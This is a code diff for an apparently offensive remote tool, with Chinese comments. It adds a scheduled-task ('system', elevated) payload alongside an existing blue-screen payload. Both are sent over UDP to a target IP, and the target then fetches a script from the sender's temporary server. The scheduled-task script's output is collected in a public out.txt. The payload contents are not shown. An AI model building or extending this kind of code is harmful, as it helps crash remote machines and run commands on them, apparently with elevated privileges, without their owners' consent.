@@ -1,6 +1,7 @@
 """远程发送的公共参数、组合发送与终端结果输出。"""
 
 from app.packets import blue_screen as packets_blue_screen
+from app.packets import elevated as packets_elevated
 from app.shared.logs import cli as cli_log
 from app.system.net.udp import send_tracked
 
@@ -125,6 +126,8 @@ def run_send(arguments):
         )
         if getattr(arguments, "e", "") == "b":
             log.debug("蓝屏载荷", "发送", packets_blue_screen.payload_hint())
+        if getattr(arguments, "system", False):
+            log.debug("计划任务载荷", "发送", packets_elevated.payload_hint())
         outcome = send_tracked(
             send_list,
             arguments.ip,
@@ -140,6 +143,12 @@ def run_send(arguments):
                 print("目标已取回蓝屏脚本")
             else:
                 print("等待目标取回蓝屏脚本超时，请确认目标能访问本机的临时端口")
+        if getattr(arguments, "system", False):
+            # 同样挂在临时服务上，退出前等目标取回脚本。
+            if packets_elevated.wait_for_elevated():
+                print("目标已取回计划任务脚本，执行输出在公共目录的 out.txt")
+            else:
+                print("等待目标取回计划任务脚本超时，请确认目标能访问本机的临时端口")
     else:
         raise ValueError(
             "请使用 remote message、remote command 或 remote device 子命令"
